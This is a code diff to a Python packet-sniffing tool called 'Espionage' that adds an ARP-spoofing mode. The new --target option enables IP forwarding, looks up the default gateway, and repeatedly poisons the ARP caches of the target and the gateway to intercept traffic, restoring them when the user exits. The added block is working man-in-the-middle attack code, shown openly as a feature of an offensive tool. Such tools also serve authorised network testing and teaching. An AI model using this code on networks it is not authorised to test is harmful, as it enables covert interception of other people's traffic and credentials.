@@ -39,14 +39,19 @@ from scapy.all import *
 from scapy.layers.http import HTTPRequest 
 
 from ext.banner import *
+
 from core.config import *
 from core.packet import Packet
 from core.frame import NetworkFrame
 from core.optformat import *
 
+from arp.cachepoison import *
+from arp.iproute import *
+
+
 global pcap_file_name # "Global variables are bad!" - NSA's programming tips
 
-__version__ = '1.0'
+__version__ = '1.1'
 
 
 def espionage_main():
@@ -86,12 +91,6 @@ def espionage_main():
                         help="displays raw packet data (byte order) recieved or sent on port 80.",
                         action="store_true")  
 
-    parser.add_argument("-s",
-                        "--scapy",
-                        help="uses scapy to intercept data sent to urls.",
-                        action="store_true")
-
-
     file_arg_section = parser.add_argument_group('(Recommended) arguments for data output (.pcap)')
     file_arg_section.add_argument("-f",
                         "--filename",
@@ -104,6 +103,13 @@ def espionage_main():
                                help="specify network interface (ie. wlan0, eth0, wlan1, etc.)",
                                type=str,
                                required=True)
+
+    spoofer_section = parser.add_argument_group('(ARP Spoofing) required arguments in-order to use the ARP Spoofing utility')
+    spoofer_section.add_argument("-t",
+                        "--target",
+                        help="specify the target IP address to spoof.",
+                        type=str,
+                        required=False)
 
     args = parser.parse_args()
 
@@ -121,7 +127,7 @@ def espionage_main():
     if args.version:
         cprint("\t  Version: {}\n".format(__version__), 'cyan', attrs=['bold'])
 
-    if args.normal:
+    elif args.normal:
         try:
             while cfg.ESPIONAGE_PROCESS_ACTIVE:
                 raw_data, addr = __socket__.recvfrom(65536)
@@ -179,7 +185,7 @@ def espionage_main():
                 print(BOLD + R + "\nExiting Espionage Interception.\n" + BOLD + G + "Packet capture saved to: {}".format(os.path.realpath(pcap_file_name)) + END)
             else: print(BOLD + R + "\nExiting Espionage Interception.\n" + BOLD + C + "Packet capture not written to file.\n" + END)
 
-    if args.verbose:
+    elif args.verbose:
         try:
             while True:
                 raw_data, addr = __socket__.recvfrom(65536)
@@ -218,7 +224,7 @@ def espionage_main():
                                 esp.print_espionage_noprefix('\t\t' + "Raw TCP/Raw-no-http Packet Bytes: ")
                                 print(espionage_textwrapper('\t\t\t', data))
                         else: pass
-                        
+
                         if args.filename:
                             PCAP(pcap_file_name).write_to_pcap_file("\n\tTCP Segment {}".format(cfg.ESPI_ASCII_DOWN_ARROW))
                             PCAP(pcap_file_name).write_to_pcap_file("\n\t\tSource Port # {}, Destination Port # {}, [Sequence] {}".format(segment_source_port, 
@@ -242,5 +248,22 @@ def espionage_main():
             if args.filename:
                 print(BOLD + R + "\nExiting Espionage Interception.\n" + BOLD + G + "Packet capture saved to: {}".format(os.path.realpath(pcap_file_name)) + END)
             else: print(BOLD + R + "\nExiting Espionage Interception.\n" + BOLD + C + "Packet capture not written to file.\n" + END)
+
+    elif args.target:
+        Route(cfg.ESPI_UNIX_LINUX_IP_ROUTE_PATH).ip_route_switch_on()
+        default_gateway = Route(cfg.ESPI_UNIX_LINUX_IP_ROUTE_PATH).get_default_gateway()
+        try:
+            while True:
+                ARPHandle(args.target, default_gateway).spoof_arp()
+                ARPHandle(default_gateway, args.target).spoof_arp()
+                time.sleep(1)
+        except KeyboardInterrupt:
+            print(BOLD + R + "\n[!] Quitting ARP Spoof. Restoring Network...\n" + END)
+            ARPHandle(args.target, default_gateway).restore_network()
+            ARPHandle(default_gateway, args.target).restore_network()
+
+
+
+
 if __name__ == "__main__":
     espionage_main()
